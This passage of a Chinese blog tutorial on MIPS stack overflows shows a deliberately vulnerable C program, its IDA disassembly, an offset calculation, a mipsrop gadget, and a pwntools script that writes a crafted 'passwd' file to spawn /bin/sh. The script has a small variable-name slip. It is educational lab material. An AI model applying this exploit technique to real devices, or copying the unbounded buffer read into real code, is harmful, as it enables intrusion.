class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_system</span><span class="params">(<span class="keyword">int</span> code,<span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">255</span>];</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> fileLen = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">    FILE *fp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> == stat(<span class="string">"passwd"</span>,&amp;fileData))</span><br><span class="line">        fileLen = fileData.st_size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((fp = fopen(<span class="string">"passwd"</span>,<span class="string">"rb"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Cannot open file passwd!n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">    ch=fgetc(fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(count &lt;= fileLen)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[count++] = ch;</span><br><span class="line">        ch = fgetc(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[--count] = '\x00';</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf,<span class="string">"adminpwd\n"</span>))</span><br><span class="line">    &#123;        </span><br><span class="line">        do_system(count,<span class="string">"ls -l"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"you have an invalid password!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看出，溢出发生在<code>main</code>函数中，且<code>main</code>函数为<strong>非叶子函数</strong>，故返回地址存放在<strong>栈</strong>上面，能够通过覆盖该地址来控制程序执行流。<br>首先进行编译。</p>
+<pre><code>mipsel-linux-gcc -static stack_vuln.c -o stack_vuln
+</code></pre><p>放入IDA查看相关函数信息。<br><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8  <span class="comment"># int __cdecl main(int argc, const char **argv, const char **envp)</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8                 .globl main</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8 main:                                    <span class="comment"># DATA XREF: _ftext+18↑o</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8                                          <span class="comment"># .got:main_ptr↓o</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8 var_1C0         = -<span class="number">0x1C0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8 var_<span class="number">1B</span>8         = -<span class="number">0x1B8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8 var_<span class="number">1B</span>4         = -<span class="number">0x1B4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8 var_<span class="number">1B</span>0         = -<span class="number">0x1B0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8 var_1AC         = -<span class="number">0x1AC</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8 var_1A8         = -<span class="number">0x1A8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8 var_1A4         = -<span class="number">0x1A4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8 var_1A0         = -<span class="number">0x1A0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8 var_A0          = -<span class="number">0xA0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8 var_6C          = -<span class="number">0x6C</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8 var_8           = -<span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8 var_4           = -<span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8                 <span class="keyword">addiu </span>  $<span class="built_in">sp</span>, -<span class="number">0x1D0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>EC                 <span class="keyword">sw </span>     $<span class="built_in">ra</span>, <span class="number">0x1D0</span>+var_4($<span class="built_in">sp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>F0                 <span class="keyword">sw </span>     $<span class="built_in">fp</span>, <span class="number">0x1D0</span>+var_8($<span class="built_in">sp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>F4                 <span class="keyword">move </span>   $<span class="built_in">fp</span>, $<span class="built_in">sp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>F8                 li      $<span class="built_in">gp</span>, <span class="number">0x4291E0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400400</span>                 <span class="keyword">sw </span>     $<span class="built_in">gp</span>, <span class="number">0x1D0</span>+var_1C0($<span class="built_in">sp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400404</span>                 <span class="keyword">addiu </span>  $<span class="built_in">v1</span>, $<span class="built_in">fp</span>, <span class="number">0x1D0</span>+var_1A0</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400408</span>                 li      $<span class="built_in">v0</span>, <span class="number">0x100</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040040</span>C                 <span class="keyword">move </span>   $<span class="built_in">a2</span>, $<span class="built_in">v0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400410</span>                 <span class="keyword">move </span>   $<span class="built_in">a1</span>, $<span class="built_in">zero</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400414</span>                 <span class="keyword">move </span>   $<span class="built_in">a0</span>, $<span class="built_in">v1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400418</span>                 la      $<span class="built_in">v0</span>, memset</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040041</span>C                 <span class="keyword">move </span>   $<span class="built_in">t9</span>, $<span class="built_in">v0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400420</span>                 <span class="keyword">bal </span>    memset</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400424</span>                 <span class="keyword">nop</span></span><br><span class="line"><span class="keyword">.text:00400428 </span>                <span class="keyword">lw </span>     $<span class="built_in">gp</span>, <span class="number">0x1D0</span>+var_1C0($<span class="built_in">fp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040042</span>C                 <span class="keyword">sw </span>     $<span class="built_in">zero</span>, <span class="number">0x1D0</span>+var_<span class="number">1B</span>4($<span class="built_in">fp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400430</span>                 <span class="keyword">sw </span>     $<span class="built_in">zero</span>, <span class="number">0x1D0</span>+var_<span class="number">1B</span>0($<span class="built_in">fp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400434</span>                 <span class="keyword">addiu </span>  $<span class="built_in">v0</span>, $<span class="built_in">fp</span>, <span class="number">0x1D0</span>+var_A0</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400438</span>                 <span class="keyword">move </span>   $<span class="built_in">a1</span>, $<span class="built_in">v0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040043</span>C                 <span class="keyword">lui </span>    $<span class="built_in">v0</span>, <span class="number">0x41</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400440</span>                 <span class="keyword">addiu </span>  $<span class="built_in">a0</span>, $<span class="built_in">v0</span>, (aPasswd - <span class="number">0x410000</span>)  <span class="comment"># "passwd"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400444</span>                 la      $<span class="built_in">v0</span>, stat</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400448</span>                 <span class="keyword">move </span>   $<span class="built_in">t9</span>, $<span class="built_in">v0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040044</span>C                 <span class="keyword">bal </span>    stat</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400450</span>                 <span class="keyword">nop</span></span><br></pre></td></tr></table></figure></p>
+<p>通过计算得到偏移：</p>
+<pre><code>offset = saved_ra - buf = -0x4 - (-0x1A0) = 0x19c
+</code></pre><p>我们要如何覆盖<code>saved_ra</code>从而控制执行流呢，这里用到了一个类似于<code>ROPgadget</code>的工具，<code>mipsrop</code>，用于寻找mips中的ROP链。<br>该工具可以在以下链接获得：<a href="https://github.com/devttys0/ida/tree/master/plugins/mipsrop" target="_blank" rel="noopener">https://github.com/devttys0/ida/tree/master/plugins/mipsrop</a></p>
+<pre><code>Python&gt;mipsrop.stackfinders()
+----------------------------------------------------------------------------------------------------------------
+|  Address     |  Action                                              |  Control Jump                          |
+----------------------------------------------------------------------------------------------------------------
+|  0x004038D0  |  addiu $a1,$sp,0x58+var_40                           |  jr    0x58+var_4($sp)                 |
+----------------------------------------------------------------------------------------------------------------
+Found 1 matching gadgets
+</code></pre><p>获得以上<code>gadget</code>。<br>在<code>do_system</code>函数中，只使用第二个参数，所以我们只需调整<code>$a1</code>即可执行<code>system($a1)</code>。<br>在此需要修改的是：<code>0x58+var_40</code>位置修改为<code>/bin/sh</code>，<code>0x58+var_4</code>位置修改为<code>do_system</code>函数地址。<br>使用以下脚本生成passwd文件即可获取shell。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">do_sys_addr = <span class="number">0x00400390</span></span><br><span class="line">gadget_addr = <span class="number">0x004038D0</span></span><br><span class="line">content = <span class="string">"A"</span> * (<span class="number">0x1a0</span> - <span class="number">0x4</span>)</span><br><span class="line">content += p32(gadget)</span><br><span class="line">content += <span class="string">"A"</span> * (<span class="number">0x58</span> - <span class="number">0x40</span>)</span><br><span class="line">content += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">content = content.ljust(<span class="number">0x1a0</span> + <span class="number">0x58</span> - <span class="number">0x4</span>, <span class="string">"A"</span>)</span><br><span class="line">content += p32(do_sys_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"passwd"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(content)</span><br></pre></td></tr></table></figure></p>
+<p>以此<code>passwd</code>作为输入，即可getshell。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/MIPS/" rel="tag"># MIPS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/13/MIPS调试环境搭建/" rel="next" title="MIPS调试环境搭建">
+                <i class="fa fa-chevron-left"></i> MIPS调试环境搭建
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2099/01/01/Diary/" rel="prev" title="Diary">
+                Diary <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/header.jpg" alt="Eros John">
+            
+              <p class="site-author-name" itemprop="name">Eros John</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/erosjohn" title="GitHub &rarr; https://github.com/erosjohn" rel="noopener" target="_blank"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MIPS汇编基础"><span class="nav-number">1.</span> <span class="nav-text">MIPS汇编基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#指令集"><span class="nav-number">1.1.</span> <span class="nav-text">指令集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MIPS指令集的指令特点"><span class="nav-number">1.1.1.</span> <span class="nav-text">MIPS指令集的指令特点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#与x86指令集的差异"><span class="nav-number">1.1.2.</span> <span class="nav-text">与x86指令集的差异</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#寄存器"><span class="nav-number">1.2.</span> <span class="nav-text">寄存器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#叶子函数与非叶子函数"><span class="nav-number">1.3.</span> <span class="nav-text">叶子函数与非叶子函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#栈溢出"><span class="nav-number">2.</span> <span class="nav-text">栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#demo"><span class="nav-number">2.1.</span> <span class="nav-text">demo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stack-vuln"><span class="nav-number">2.2.</span> <span class="nav-text">stack_vuln</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Eros John</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.0"></script>
+
+  <script src="/js/motion.js?v=7.1.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
